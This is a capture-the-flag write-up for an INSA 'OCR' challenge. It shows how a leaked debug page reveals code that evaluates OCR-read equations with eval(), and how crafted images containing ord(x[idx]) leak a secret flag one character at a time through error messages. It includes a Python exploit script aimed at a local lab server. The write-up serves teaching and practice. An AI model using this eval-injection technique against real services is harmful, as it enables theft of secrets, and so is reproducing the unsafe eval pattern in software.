## OCR

First of all, we need to build the **docker container** with the following command:

```commandline
docker build -t ocr .
```

Then, we can start the **image** from the GUI and expose the port `8080:5000`.

### Inspecting the page

By inspecting the page, we can see a **comment**:

```html
<!-- TODO: Remove me -->
<!-- /debug -->
```

And by visiting that page we get the website's **source code**.
The first thing we notice, is that the **flag** is saved in a **global variable**:

```python
x = open("private/flag.txt").read()
```

Then, we can see that in order to get a result, we need to pass the following checks:

- We can only use lowercase letters, numbers and these symbols: `()[]=+-*`
- We can use a **maximum of one each** of the following symbols: `()[]`
- The length of the equation can be 15 characters at most.

### Exploiting the logic

With these constraints, we need to craft an equation such that:

```python
# The following code is a bit simplified to understand the logic
parts = input_text.split("=", maxsplit=2)

pa_1 = int(eval(parts[0]))
pa_2 = int(eval(parts[1]))

if pa_1 != pa_2:
    return ("Sorry but it seems that %d is not equal to %d") % (pa_1, pa_2)
```

If we manage to pass `ord(x[idx])` to the `eval` function, we can get the **ASCII** value of every character.
It's necessary, because it is wrapped in an `int` constructor.

This way we can "easily" iterate over the flag's characters and get them back. "Easily" because we now need to 
actually create all the images to send and evaluate.

### Python script

Instead of taking **screenshots** and sending them individually through the **browser**, we can use `Pillow` to create 
an **image** from a given string with the following code:

```python
from PIL import Image, ImageDraw, ImageFont

def craft_image(text: str) -> Image.Image:
    image = Image.new("RGB", (512, 128), "white")
    draw = ImageDraw.Draw(image)

    font = ImageFont.truetype("arial.ttf", 64)
    draw.text((256, 64), text, (0, 0, 0), font, "mm")

    return image
```

This is the first image for example:

![First equation](image.png)

Now we need to send it to the server as a `POST` request to the `/equation` endpoint.
However, we need to first transform the `Pillow.Image` into streamable bytes. 

```python
from io import BytesIO
from requests import post as post_request

# Craft the image from the string
equation_text = f"ord(x[{idx}]) = 0"
equation_image = craft_image(equation_text)

# Convert the image into bytes to upload
buffer = BytesIO()
equation_image.save(buffer, "PNG")
image_bytes = buffer.getvalue()

# Send the request to the server
url = "http://localhost:8080/equation"
response = post_request(url, files={"file": image_bytes})
```

Then, since we made it this far and don't want to manually convert the **ASCII** characters, we can use 
`BeautifulSoup` to identify the `<h1>` where the response is being displayed. Then, we can extract the **ASCII** 
value and convert it into a character like so:

```python
from bs4 import BeautifulSoup

soup = BeautifulSoup(response.text, "html.parser")
result = soup.find("h1").text
flag_char = chr(int(result.split()[5]))
```

Finally, by **iterating** over the characters, we get the flag in its entirety:

```
INSA{0cr_L0ng}
```
